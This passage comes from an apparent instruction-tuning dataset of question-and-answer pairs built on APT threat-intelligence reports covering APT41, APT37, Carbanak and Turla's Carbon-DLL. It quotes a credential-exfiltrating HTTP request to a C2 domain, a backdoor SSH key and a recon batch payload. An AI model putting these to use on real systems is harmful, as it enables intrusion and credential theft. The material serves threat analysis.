case. Meanwhile, it's more difficult for us to tracing when facing such modeled attack.\nOne of the leaders in Information Security area-Bruce Schiner said, \"when big events on information security happened, people tend to treat it as an example of cyber warfare. It's ridiculous. From my point of view, what's happening and going to happen is: more and more tactics in physical warfare are applied to cyber warfare. It's important to note that, attack capabilities can be widely distributed if attackers take full advantages of certain technology, especially computer technology can make attack more powerful and automated.\" Obviously, highly automated commercial platform realized a high speed of spread of this attack capability (exceeded our anticipation).\nWe have to remind all relevant parties that we are confronting with the risk of large scale diffusion of network armaments which is led by the low cost of the attack capability. The commercial penetration attack detecting platform has two sides, on one hand, it can check the network environment of systems effectively, on the other hand, for nations, organizations and industries which has limited budget, it costs too much. Given the situation, all related parties should conduct more communication with each other, additionally, there is no doubt that both offensive party and defensive party are supported by superpowers, these superpowers should prevent the attack technique from widely distributing.\nThe incident mentioned there has no difference with other cases we detected in the past, it shows that, on the way to realize national informatizaion, we must fight against serious security challenges as we confronting now; it's also a good opportunity for our Chinese people and enterprises to demonstrate our faith and the efforts we made to conquer the challenge.\nMedium Headline: Appendix 1 References of Cobalt Strike and the author\nCobalt Strike is the business version of Armitage which is the penetration testing software of Metasploit figure interface written by Java. Armitage can carry out automatic attacks by combining with known exploits of Metasploit. It integrates the free version of Armitage under bt5 and kali linx, and the most powerful functionality is adding the Payload of Beacon.\nThe first release time of Cobalt Strike is June, 2012.\nSmall Headline: Author of Cobalt Strike: Raphael Mudge\nRaphael Mudge is the founder of Strategic Cyber LLC, a Washington, DC based company that creates software for red teams. He created Armitage for Metasploit, the Sleep programming language, and the IRC client jIRCii. Previously, Raphael worked as a security researcher for the US Air Force, a penetration tester, and he even invented a grammar checker that was sold to Automattic. His work has appeared in Hakin9, USENIX ;login:, Dr. Dobb's Journal, on the cover of the Linux Journal, and the Fox sitcom Breaking In. Raphael regularly speaks on security topics and provides red team support to many cyber defense competitions.\nEducation background: Syracuse University, Michigan Technological University\nCurrent position: Strategic Cyber LLC , Delaware Air National Guard\nSkills: software development, information security, object-oriented design, distributed system, figure interface, computer network design, blog system, social engineering, security research and so on.\nMedium Headline: Appendix 2 About Antiy\nAntiy Labs is a professional next-generation security-testing engine R&D enterprise. Antiy's engines provide the ability to detect various viruses and malware for network security products and mobile devices, which are used by more than ten well known security vendors. Antiy's engines are embedded in tens of thousands of firewalls and tens of millions of mobile phones all over the world. Antiy Labs is awarded the \"Best Protection\" prize by AV-TEST in 2013. Based on engines, sandboxes and background systems, Antiy Labs will continue to provide traffic-based anti-APT solutions for enterprises.\nAnswer this question: How does APT-TOCS utilize 'powershell.exe' to achieve remote control on the targeted system, and what are the potential methods for script downloading privilege?",
    "output": "APT-TOCS uses 'powershell.exe' to execute Shellcode scripts to achieve remote control on the targeted system. The attacker might employ several remote injection methods for script downloading privilege, such as directly making the script be executed on the host by using security vulnerabilities. Additionally, a PE sample (Sample A) was found to have similar functionality code as the Shellcode script, indicating that the 'leading file' can be regarded as the leading part of the attack. However, the execution and control can also be made depending on system and application vulnerabilities without this leading file.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What specific characteristics linked the phishing attempts against David Satter and the Bellingcat contributor? How did these characteristics help in attributing the attacks to the same threat actor?",
    "output": "The phishing attempts against David Satter and the Bellingcat contributor shared several specific characteristics. Both emails were sent at 10:59am EST using the same sending address: g.mail2017[@]yandex.com. Additionally, both emails included a fake Gmail footer that was distinctively modified from Gmail's original footer. These commonalities, along with the fact that the malicious links embedded in these phishing emails were configured to redirect the targets to addresses hosted on the URL shortening service Tiny.cc, helped in attributing the attacks to the same threat actor.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: References\n1 Trend Micro. (April 19, 2017). Trend Micro. \"Examining a Possible Member of the Winnti Group.\" Accessed on July 9, 2021, at (<https://www.trendmicro.com/en_us/research/17/d/pigs-malware-examining-possible-member-winnti-group.html>)https://www.trendmicro.com/en_us/research/17/d/pigs-malware-examining-possible-member-winnti-group.html.\n2 Joseph C. Chen et al. (July 9, 2021). Trend Micro. \"BIOPASS RAT: New Malware Sniffs Victims via Live Streaming.\" Accessed on July 9, 2021, at (<https://www.trendmicro.com/en_us/research/21/g/biopass-rat-new-malware-sniffs-victims-via-live-streaming.html>)https://www.trendmicro.com/en_us/research/21/g/biopass-rat-new-malware-sniffs-victims-via-live-(<https://www.trendmicro.com/en_us/research/21/g/biopass-rat-new-malware-sniffs-victims-via-live-streaming.html>)streaming.html.\n3 Benson Sy. (June 29, 2015). Trend Micro. \"MERS News Used in Targeted Attack against Japanese Media Company.\" Accessed on July 9, 2021, at (<https://blog.trendmicro.com/trendlabs-security-intelligence/mers-news-used-in-targeted-attack-against-japanese-media-company/>)https://blog.trendmicro.com/trendlabs-security-intelligence/mers-news-used-in-targeted-attack-(<https://blog.trendmicro.com/trendlabs-security-intelligence/mers-news-used-in-targeted-attack-against-japanese-media-company/>)against-japanese-media-company/.\n4 Daniel Lunghi et al. (Feb. 18, 2020). Trend Micro. \"Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations.\" Accessed on July 9, 2021, at (<https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/operation-drbcontrol-uncovering-a-cyberespionage-campaign-targeting-gambling-companies-in-southeast-asia>)https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/ (<https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/operation-drbcontrol-uncovering-a-cyberespionage-campaign-targeting-gambling-companies-in-southeast-asia>)operation-drbcontrol-uncovering-a-cyberespionage-campaign-targeting-gambling-companies-in-southeast-asia.\n5 The United States Department of Justice. (Sept. 16, 2020). The United States Department of Justice. \"Seven International Cyber Defendants, Including 'Apt41' Actors, Charged In Connection With Computer Intrusion Campaigns Against More Than 100 Victims Globally.\" Accessed on July 16, 2021, at (<https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer>)https://www.justice.gov/opa/pr/seven-international-cyber-defendants-(<https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer>)including-apt41-actors-charged-connection-computer.\n6 Positive Technologies. (Jan. 14, 2021). Positive Technologies. \"Higaisa or Winnti? APT41 backdoors, old and new.\" Accessed on July 16, 2021, at (<https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new>)https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-(<https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new>)backdoors-old-and-new.\n7 Christopher Glyer et al. (March 25, 2020). FireEye Threat Research Blog. \"This Is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple Exploits.\" Accessed on July 16, 2021, at (<https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html>)https://www.fireeye.com/blog/threat-research/2020/03/ (<https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html>)apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html.\n8 Bernardo Damele, Miroslav Stampar, and Alessandro Tanasi. (Jan. 19, 2021). Github. \"sqlmap/plugins/dbms/mssqlserver/ filesystem.py.\" Accessed on July 16, 2021, at (<https://github.com/sqlmapproject/sqlmap/blob/master/plugins/dbms/mssqlserver/filesystem.py#L281-L333>)https://github.com/sqlmapproject/sqlmap/blob/master/plugins/dbms/ (<https://github.com/sqlmapproject/sqlmap/blob/master/plugins/dbms/mssqlserver/filesystem.py#L281-L333>)mssqlserver/filesystem.py#L281-L333.\n9 Nitesh Surana. (April 14, 2021). Trend Micro. \"Could the Microsoft Exchange breach be stopped?\" Accessed on July 22, 2021, at (<https://www.trendmicro.com/en_us/devops/21/d/could-the-microsoft-exchange-breach-be-stopped.html>)https://www.trendmicro.com/en_us/devops/21/d/could-the-microsoft-exchange-breach-be-stopped.html.\n10 Thomas Dupuy, Matthieu Faou, and Mathieu Tartare. (March 10, 2021). WeLiveSecurity. \"Exchange servers under siege from at least 10 APT groups.\" Accessed on July 16, 2021, at (<https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups>)https://www.welivesecurity.com/2021/03/10/exchange-servers-under-(<https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups>)siege-10-apt-groups.\n11 ambray. (Oct 24, 2017). GitHub. \"ProcessHollowing/ShellLoader/Loader.cs.\" Accessed on July 16, 2021, at (<https://github.com/ambray/ProcessHollowing/blob/master/ShellLoader/Loader.cs>)https://github. (<https://github.com/ambray/ProcessHollowing/blob/master/ShellLoader/Loader.cs>)com/ambray/ProcessHollowing/blob/master/ShellLoader/Loader.cs.\n12 Yoshihiro Ishikawa. (May 21, 2021). LAC. \"Microsoft\u793e\u306e\u30c7\u30b8\u30bf\u30eb\u7f72\u540d\u3092\u60aa\u7528\u3057\u305f\u300cCobalt Strike loader\u300d\u306b\u3088\u308b\u6a19\u7684\u578b\u653b\u6483\u301c\u653b\u6483\u8005\u30b0\u30eb\u30fc\u30d7APT41.\" Accessed on July 16, 2021, at (<https://www.lac.co.jp/lacwatch/report/20210521_002618.html>)https://www.lac.co.jp/lacwatch/report/20210521_002618.html.\n13 Internet Research Task Force. (May 2015). IETF Trust. \"ChaCha20 and Poly1305 for IETF Protocols.\" Accessed on July 16, 2021, at (<https://datatracker.ietf.org/doc/html/rfc7539>)https://datatracker.ietf.org/doc/html/rfc7539.\n14 Raphael Mudge. (April 9, 2018). CobaltStrike. \"Cobalt Strike 3.11 \u2013 The snake that eats its tail.\" Accessed on July 16, 2021, at (<https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail>)https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail.\n15 CyCraft Research Team. (April 15, 2020). Cycraft. \"APT Group Chimera - APT Operation Skeleton Key Targets Taiwan Semiconductor Vendors.\" Accessed on July 16, 2021, at (<https://cycraft.com/download/%5BTLP-White%5D20200415%20Chimera_V4.1.pdf>)https://cycraft.com/download/%5BTLP-White%5D20200415%20 (<https://cycraft.com/download/%5BTLP-White%5D20200415%20Chimera_V4.1.pdf>)Chimera_V4.1.pdf.\n16 Takahiro Haruyama. (2021). VMware Carbon Black. \"Knock, knock, Neo. - Active C2 Discovery Using Protocol Emulation.\" Accessed on July 16, 2021, at (<https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_201_haruyama_jp.pdf>)https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_201_haruyama_jp.pdf.\n17 The United States Department of Justice. (Aug. 13, 2020). The United States Department of Justice. \"Seven International Cyber Defendants, Including 'Apt41' Actors, Charged In Connection With Computer Intrusion Campaigns Against More Than 100 Victims Globally.\" Accessed on July 16, 2021, at (<https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer>)https://www.justice.gov/opa/pr/seven-international-cyber-defendants-(<https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer>)including-apt41-actors-charged-connection-computer.\n18 Sudeep Singh and Atinderpal Singh. (June 11, 2020). ZScaler. \"The Return of the Higaisa APT.\" Accessed on July 16, 2021, at (<https://www.zscaler.com/blogs/security-research/return-higaisa-apt>)https://www.zscaler.com/blogs/security-research/return-higaisa-apt.\n19 VMware. (Sept. 30, 2019). VMware. \"CB Threat Analysis Unit: Technical Analysis of 'Crosswalk.'\" Accessed on July 16, 2021, at (<https://www.carbonblack.com/blog/cb-threat-analysis-unit-technical-analysis-of-crosswalk>)https://www.carbonblack.com/blog/cb-threat-analysis-unit-technical-analysis-of-crosswalk.\n20 CyCraft Technology Corp. (June 2, 2021). Medium. \"China-Linked Threat Group Targets Taiwan Critical Infrastructure, Smokescreen Ransomware.\" Accessed on July 16, 2021, at (<https://medium.com/cycraft/china-linked-threat-group-targets-taiwan-critical-infrastructure-smokescreen-ransomware-c2a155aa53d5>)https://medium.com/cycraft/china-linked-threat-group-targets-(<https://medium.com/cycraft/china-linked-threat-group-targets-taiwan-critical-infrastructure-smokescreen-ransomware-c2a155aa53d5>)taiwan-critical-infrastructure-smokescreen-ransomware-c2a155aa53d5.\n21 Nikita Rostovcev. (June 10, 2021). Group-IB. \"Big airline heist: APT41 likely behind massive supply chain attack.\" Accessed on July 16, 2021, at (<https://blog.group-ib.com/colunmtk_apt41>)https://blog.group-ib.com/colunmtk_apt41.\n22 Trend Micro. (n.d.). Trend Micro. \"XDR.\" Accessed on July 22, 2021, at (<https://www.trendmicro.com/en_us/business/products/detection-response/xdr.html>)https://www.trendmicro.com/en_us/business/ (<https://www.trendmicro.com/en_us/business/products/detection-response/xdr.html>)products/detection-response/xdr.html.\n23 Trend Micro. (n.d.). Trend Micro. \"Managed XDR.\" Accessed on July 22, 2021, at (<https://www.trendmicro.com/en_us/business/products/detection-response/managed-xdr-mdr.html>)https://www.trendmicro.com/en_us/ (<https://www.trendmicro.com/en_us/business/products/detection-response/managed-xdr-mdr.html>)business/products/detection-response/managed-xdr-mdr.html.\n\nBased on the above text, answer a question. How does the reference to the United States Department of Justice's charges against Earth Baku (APT41) provide insight into the group's activities and the broader implications of their operations?",
    "output": "The reference to the United States Department of Justice's charges against Earth Baku (APT41) highlights the severity and scope of the group's activities. The charges include computer intrusion offenses related to data theft, ransomware, and cryptocurrency mining attacks, indicating that Earth Baku is involved in a wide range of cybercrimes. This provides insight into the group's capabilities and the potential impact of their operations on various sectors and countries. The charges also underscore the global reach of APT41, as they were accused of targeting over 100 victims globally, emphasizing the need for international cooperation in addressing such threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the primary targets of APT34, and what are some of the countries most frequently targeted by this group?",
    "output": "APT34 primarily targets organizations worldwide, particularly those in the financial, government, energy, chemical, and telecommunications industries in the Middle East. The top countries targeted by APT34 include the United Arab Emirates, China, Jordan, and Saudi Arabia. Other countries in the Middle East, such as Qatar, Oman, Kuwait, Bahrain, Lebanon, and Egypt, are also considered targets, although not at the top of the group's list.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Overview\nBitdefender detected and blocked an ongoing cyber-espionage campaign against Romanian institutions and other foreign targets. The attacks started in 2014, with the latest reported occurrences in May of 2016. The APT, dubbed Pacifier by Bitdefender researchers, makes use of malicious .doc documents and .zip files distributed via spear phishing e-mail.\nDocuments used range from curriculum vitae, to invitations to social functions or conferences, to second hand car offers and even, in one case, a letter of instructions from a high-ranking official. Some were marked as \"urgent\", \"important\", \"immediate action required\" and so on.\nOther samples of the same malicious software were detected in Iran, India, Philippines, Russia, Lithuania, Thailand, Vietnam and Hungary.\nThe high number of variants, in conjunction with the low number of reports and the nature of the affected machines has brought us to the conclusion that we are dealing with an APT.\nThe malicious payloads delivered evolved over time, becoming stealthier and adding functionality as time went by. Our analysis focuses on three representative variants of the malware used in the attacks, but a number of others, differing by minor details, were found in the wild.\nAside from the analysis, this paper lists hashes of malicious files, as well as other IOCs.\n\nQ: Why did Bitdefender classify the cyber-espionage campaign targeting Romanian institutions and other foreign targets as an Advanced Persistent Threat (APT), specifically named Pacifier?",
    "output": "A: Bitdefender classified the cyber-espionage campaign as an APT due to several key factors. Firstly, the campaign was ongoing and persistent, starting in 2014 and continuing until at least May 2016. Secondly, the attackers employed sophisticated methods such as using malicious .doc documents and .zip files distributed via spear phishing emails. These documents included various types of content designed to entice targets, such as curriculum vitae, invitations to social functions or conferences, second-hand car offers, and even a letter of instructions from a high-ranking official. Additionally, the high number of variants of the malicious payloads, combined with the low number of reports and the specific nature of the affected machines, indicated a targeted and advanced operation. The malware evolved over time, becoming stealthier and adding new functionalities, which further supported the classification as an APT.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 4.2.2 SSHDoor Client and Server\nShortly after successfully executing the downloaded privilege escalation code, the attackers again utilized WGET to download three additional binaries from IP address 95.215.46.116 named ssh, sshd and auditd. The ssh binary was a trojanized version of the OpenSSH 5.3p1 client binary, with the sshd binary a trojanized version of the server binary. These backdoors are variants of the SSHDOOR Trojan that was observed and reported in 2013.15\nWhile the previously observed SSHDOOR used an XOR scheme to store an SSH pre-shared key and its HTTP Request Format Strings, this version used RC4 encryption to store the same information. The decrypted SSH pre-shared key and HTTP Format Strings are shown in Figure 16.\nAs was the case with the previous version of SSHDOOR, upon successful authentication using the client or server binary, the authenticated credentials are sent to the attacker via HTTP GET Request. In the case of these binaries, the source host's MAC address would be normalized to lowercase and included in the first key-value pair of the URI, with the username, password and destination hostname and IP address encoded into a Base64 string and placed in the second key-value pair of the URI. These HTTP requests would\nbe sent to the C2 domains of centos-repo.org or slpar.org, depending on the version of the binary executed. An example of this is shown in Figure 17.\n15 Duquette; \"Linux/SSHDoor.A Backdoored SSH daemon that steals passwords\";\nGET    /?cid=000c29450e28&text=cm9vdCAtPiBUaGlzSXNZb3VyUGFzc3dvcm   Q6cm9vdEAxOTIuMTY4LjE2My4xODUK HTTP/1.0\nHost: centos-repo.org\nRed text = MAC address of affected system (lowercase normalized)\nBlue text = Base64 Username:Password representation.\nDecoded Base64 String:\nroot -> ThisIsYourPassword:root@192.168.163.185\nFigure 17: Credential Harvesting HTTP Request\nAdditionally, both versions of SSHDOOR allow unauthorized access when authenticated with the decrypted SSH pre-shared key. These trojanized binaries allowed the attackers to gain additional credentials that would assist them in moving laterally into the internal server environment. The authorized_hosts entry the attackers utilized with the SSHDOOR binary is shown in Figure 18.\nssh-rsa  AAAAB3NzaC1yc2EAAAADAQABAAABAQDAkqHYDX7rAoj6DNKLe4e   7a7XFrbMRErtd6y/shqDaxSMMlXAfK6P2OQE9FmPPLDWjgkDgSyOvC0g   TyghdGYdgKMV4DnhFiMMt4atOWwI86w71q9SEVGKKGVWLhIaCn   GpWkWQmGGGnCOHbLezhLTnv98wscNdZLVafTOM/HqWkRcpr2XTO   Phag/6FsXQsMKnJOZqloG5MWwdaYyIXBYEGRCA103MPmimW2jq   Y91JxQ+7xEeD4XB1s9gNakHuQsDNNYY63kfiG8UAbOGQq   88mpsB32Ofjz6qdAgYPzBZzCoMnvhtDSTyKPYjoeDEHXMWZU   /3PZbjuejbM8v5F9FiH4p  centos-repo.org\nFigure 18: Pre-Shared SSH Key Used by SSHDOOR\nThe file information for the SSHDOOR client and server binaries with the C2 address of centos-repo.org are shown in Table 1 and Table 2, respectively.\nThe file information for the SSHDOOR client and server binaries with the C2 address of slpar.org are shown in Table 3 and Table 4, respectively.\nSmall Headline: 4.2.3 AudiTunnel\nThe AUDITUNNEL binary is a reverse tunneling tool similar in functionality to netcat, but with support for multiple tunnels, Socks5 proxy and XOR encoded communication. It was downloaded, along with the SSHDOOR binaries from 95.215.46.116, under the name 'auditd.' Upon execution, it creates a TCP socket and connects to C2 IP address 95.215.46.116 over TCP/443, creating a reverse tunnel to allow access to the victim server. Once the connection was made, AUDITUNNEL would keep the connection alive to allow inbound or outbound connectivity through this tunnel. In order to better hide its network activity, this utility would XOR all data passed through the tunnel with a key of 0x41. This binary is also able to communicate via the Socks5 protocol using Basic authentication. These three binaries proved to be the attackers' primary method of ingress and credential harvesting for the first half of the incident. An example of the XOR network traffic associated with AUDITUNNEL is shown in Figure 19.\nAfter the attackers observed little change to their malware C2 channels once system ALPHA was remediated, the attackers quickly moved to system CHARLIE, the Linux Syslog server. This allowed them a communication channel to all other systems within the Linux environment, as well as allowing the attackers to control both centralized and local log entries across all Linux systems accessed. At this time, the attackers moved the majority of their toolset to CHARLIE, leaving only the SSHDOOR server binary on system ALPHA for further credential harvesting. The Syslog server would remain one of their primary staging points throughout the rest of the incident.\nThe file information for AUDITUNNEL is shown in Table 5.\n\nQ: What was the role of the AUDITUNNEL binary in the CARBANAK intrusion and how did it facilitate the attackers' operations?",
    "output": "A: The AUDITUNNEL binary served as a reverse tunneling tool similar to netcat but with additional features such as support for multiple tunnels, Socks5 proxy, and XOR encoded communication. It was downloaded alongside the SSHDOOR binaries from 95.215.46.116 under the name 'auditd.' Upon execution, AUDITUNNEL created a TCP socket and connected to the C2 IP address 95.215.46.116 over TCP/443, establishing a reverse tunnel to allow access to the victim server. This utility kept the connection alive to enable inbound or outbound connectivity through the tunnel. To hide its network activity, AUDITUNNEL XORed all data passed through the tunnel with a key of 0x41. Additionally, it could communicate via the Socks5 protocol using Basic authentication. These binaries were the attackers' primary method of ingress and credential harvesting for the first half of the incident.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: Gaining Information and the Task Format\nAs mentioned earlier above, tasks appear in a specific container format. In case of Carbon-DLL, it roughly looks like this:\nFigure 7: Task Format\nFirst, every task has a unique task ID, which is also returned together with the results. This is important, because it allows the attackers to link results and tasks.\nThe routing blob can contain one or more trojan IDs of the next hop, combined with transport information (TCP plus address, or a named pipe, potentially with authentication). Every hop removes one element of this routing blob before forwarding to the next, and as soon as the routing blob is empty, the bot knows it is the one to execute the task.\nWhen a task is executed, the task-code is checked. The remaining data format depends on this code. It usually is 0, which means the execution of a standard task - this is also the format shown in the table. In this case, two blobs follow: the payload and the config data. Here is the example of a payload, which is a batch script, in this case a typical initial recon activity:\n1 ipconfig -all\n2 netstat -r\n3 netstat -an\n4 nbtstat -n\n5 nbtstat -s\n6 net share\n7 net file\n8 net session\n9\nnet use\n10\nnet group\n11\nnet view\n12\nnet config\n13\nsysteminfo\n14\nnet time \\\\127.0.0.1\nBut the bot still needs to know what to do with this. This is what the config data -always plain text -is for. It might look like this:\n1 [CONFIG]\n2 name = %TEMP%\\sysh32.bat\nThis example means that the bot should to the following steps:\n1. store the payload in the file %TEMP%\\sysh32.bat\n2. execute the command cmd.exe /c \"%TEMP%\\sysh32.bat\" (using CreateProcess) -so this will actually execute the payload as a batch script (/c option)\n3. remove %TEMP%\\sysh32.bat (the payload file is always automatically removed)\n4. the standard output is returned to the C&C server\nThere are special parameters in regard what to return, for example the content of some file instead of the standard output, or how to deal with standard error.\nA similar binary format exists for the returned task results.\nIf the task-code is between 1 and 99, a special task is executed (it also means that the rest of the container format changes accordingly). Some of these tasks require sub-task-codes. Some of these special tasks are:\n\u2022 55: update (a sub-task-code tells what to update, like which binary, or the config file)\n\u2022 57: install a plugin\n\u2022 62: install the server public key -this will also generate a new private bot key\nThe format described is used by Carbon-DLL. Tavdig is using a similar, but simplified format. It mainly lacks the routing blob and task-code (it implicitly is 0). But Tavdig also includes task-IDs.\n\nHow does the task format in the Carbon-DLL malware facilitate the execution of commands across multiple hops, and what role does the routing blob play in this process?",
    "output": "The task format in the Carbon-DLL malware uses a specific container format that includes a unique task ID and a routing blob. The routing blob contains one or more trojan IDs of the next hop, along with transport information such as TCP plus address, or a named pipe, potentially with authentication. Each hop removes one element of the routing blob before forwarding to the next, and when the routing blob is empty, the bot executes the task. This mechanism allows the attackers to route commands through multiple hops, making it harder to trace the origin of the commands and increasing the complexity of the attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Exploited Vulnerabilities\nAPT37 frequently exploits vulnerabilities in Hangul Word Processor (HWP) due to the software's prevalence in South Korea. Further, the group recently demonstrated access to zero-day vulnerabilities (CVE-2018-0802) and has the flexibility to quickly incorporate recently publicized vulnerabilities into spear phishing and strategic web compromise operations. These capabilities suggest a high operational tempo and specialized expertise.\nAPT37 has repeatedly deployed exploits, especially in Flash, quickly after vulnerabilities are initially publicized (see Table 1). CVE-2016-4117, CVE-2016-1019 and CVE-2015-3043 were all exploited by APT37 in this way. FireEye iSIGHT Intelligence confirmed that since at least November 2017, APT37\nexploited a zero-day Adobe Flash vulnerability, CVE-2018-4878, to distribute DOGCALL malware to South Korean victims.\nWhile use and discovery of zero-day exploits over the past several years has expanded beyond a nation-state dominated environment to include commercial vendors of cyber espionage capabilities and sophisticated financially motivated actors, access to zero-day exploits remains a factor in distinguishing sophisticated or well-resourced actors.\nFigure 3 details the vulnerabilities exploited by APT37, comparing the time of exploitation to the time the CVE was released.\nBig Headline: Command and Control Infrastructure\nAPT37 uses a variety of techniques for command and control. They leverage compromised servers, messaging platforms and cloud service providers to avoid detection. The group often relies on compromised sites to host second stage malware payloads. Over time, APT37 has changed the email providers to set up command and control accounts in a possible attempt to cover their tracks and cause misdirection. These tactics have been refined over the years as APT37 evolves to evade network defenders.\nAPT37 has used various legitimate platforms as command and control for its malware tools. While some early campaigns leveraged POORAIM, which abused AOL Instant Messenger, newer activity deploys DOGCALL, which uses cloud storage APIs such as pCloud and Dropbox.\nAPT37 relies on compromised websites to host second stage malware. Small websites focused on subjects such as aromatherapy and scuba diving have been leveraged, and were most likely compromised opportunistically and made to host malicious payloads.\nAPT37 has improved its operational security over time. For example, early 2015 use of SLOWDRIFT involved credentials associated with Korea related mail servers such as \"Daum.net\". Later, in 2015 and early 2016, APT37 pivoted to different email providers such as Gmail and \"hmamail.com\" in an attempt to anonymize activity. Then from mid-2016 onward, APT37 began using @yandex.com and @ india.com email accounts -- possibly an attempt to cause misattribution.\nBig Headline: Malware\nAPT37 employs a diverse suite of malware for initial intrusion and exfiltration. Their malware is characterized by a focus on stealing information from victims, with many set up to automatically exfiltrate data of interest. Figure 4 shows APT37's malware usage over time. A full breakdown of the malware we associate with APT37, along with how it is detected by FireEye devices, is available in the Appendix.\nAlong with custom malware used for espionage purposes, APT37 also has access to destructive malware. In April 2017, APT37 targeted South Korean military and government organizations with the DOGCALL backdoor and RUHAPPY wiper malware. Although the wiper capability was not used in the identified instance, RUHAPPY can overwrite a machine's Master Boot Record (MBR), causing the system to fail to boot into preconfigured partitions.\nIt is possible that APT37's distribution of KARAE malware via torrent websites could assist in creating and maintaining botnets for future distributed denial-of-service (DDoS) attacks, or for other activity such as financially motivated campaigns or disruptive operations. Disruptive and destructive cyber threat activity, including the use of wiper malware, public leaks of proprietary materials by false hacktivist personas, DDoS attacks and electronic warfare tactics such as GPS signal jamming is consistent with past behavior by other North Korean actors.\nBig Headline: Attribution\nWe assess with high confidence that APT37 acts in support of the North Korean government and is primarily based in North Korea. This assessment is based on multiple factors, including APT37's targeting profile, insight into the group's malware development and probable links to a North Korean individual believed to be the developer of several of APT37's proprietary malware families:\n\u2022 An individual we believe to be the developer behind several APT37 malware payloads inadvertently disclosed personal data showing that the actor was operating from an IP address and access point associated with North Korea.\n\u2022 The compilation times of APT37 malware is consistent with a developer operating in the North Korea time zone (UTC +8:30) and follows what is believed to be a typical North Korean workday (Fig. 5). The majority of malware compilation times occurred between 10:00 a.m. and 7:00 p.m., with\na dip around noon. Additional activity occurred late into the evening. This is consistent with media reporting of extremely long hours for North Korean workers.\n\u2022 The majority of APT37 activity continues to target South Korea, North Korean defectors, and organizations and individuals involved in Korean Peninsula reunification efforts. Similarly, APT37 targeting of a Middle Eastern company in 2017 is also consistent with North Korean objectives given the entity's extensive relationships inside North Korea.\n12 a.m. 1 a.m. 2 a.m 3 a.m 4 a.m 5 a.m 6 a.m 7 a.m 8 a.m 9 a.m. 10 a.m 11 a.m. 12 p.m. 1 p.m. 2 p.m. 3 p.m. 4 p.m. 5 p.m. 6 p.m. 7 p.m. 8 p.m. 9 p.m. 10 p.m. 11 p.m.\n\nAnswer this question based on the above context: What techniques does APT37 employ for command and control infrastructure, and how have these evolved over time to evade detection?",
    "output": "APT37 uses a variety of techniques for command and control, including leveraging compromised servers, messaging platforms, and cloud service providers to avoid detection. They often rely on compromised sites to host second stage malware payloads, such as small websites focused on subjects like aromatherapy and scuba diving. Early campaigns used POORAIM, which abused AOL Instant Messenger, while newer activity deploys DOGCALL, utilizing cloud storage APIs like pCloud and Dropbox. APT37 has also changed email providers over time, moving from Korea-related mail servers to Gmail, hmamail.com, and later to yandex.com and india.com, possibly to cause misattribution and cover their tracks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: KEY FINDINGS\n10. YEARS\nAPT30's development and refinement of a set of integrated tools, as well as their re-use of infrastructure over a period of 10 years, suggests a consistent long-term mission. This suite of tools includes downloaders, backdoors, a central controller, and several components designed to infect removable drives and cross air-gapped networks to steal data. APT30 frequently registers their own DNS domains for use with malware command and control (C2). Based on their presence in malware samples, some of the domains have been in use for many years.\nAPT30 has a structured and organized workflow, illustrative of a collaborative team environment, and their malware reflects a coherent development approach. The group (or the developers supporting them) systematically labels and keeps track of their malware versioning. The malware uses mutexes and events to ensure only a single copy is running at any given time, and the malware version information is embedded within the binary. Malware C2 communications include a version check that allows the malware to update itself to the latest copy, providing a continuous update management capability.\nThe controller software for APT30's BACKSPACe backdoor (also known as \"Lecna\") suggests the threat actors prioritize targets and may work on shifts. APT30 backdoors commonly use a two-stage C2 process, where victim hosts contact an initial C2 server to determine whether they should connect to the attackers' main controller. The controller itself uses a GUI that allows operators to prioritize hosts, add notes to victims, and set alerts for when certain hosts come online. Finally, an unused dialog box in the controller provides a login prompt for the current \"attendant.\"\nThe group's primary goal appears to be sensitive information theft for government espionage.\nAPT30 malware includes the ability to steal information (such as specific file types), including, in some cases, the ability to infect removable drives with the potential to jump air gaps. Some malware includes commands to allow it to be placed in \"hide\" mode and to remain stealthy on the victim host, presumably for long-term persistence.\nAPT30 predominantly targets entities that may satisfy governmental intelligence collection requirements. The vast majority of APT30's victims are in Southeast Asia. Much of their social engineering efforts suggest the group is particularly interested in regional political, military, and economic issues, disputed territories, and media organizations and journalists who report on topics pertaining to China and the government's legitimacy.\nMedium Headline: In It for the Long Haul\nOur analysis of APT30's malware 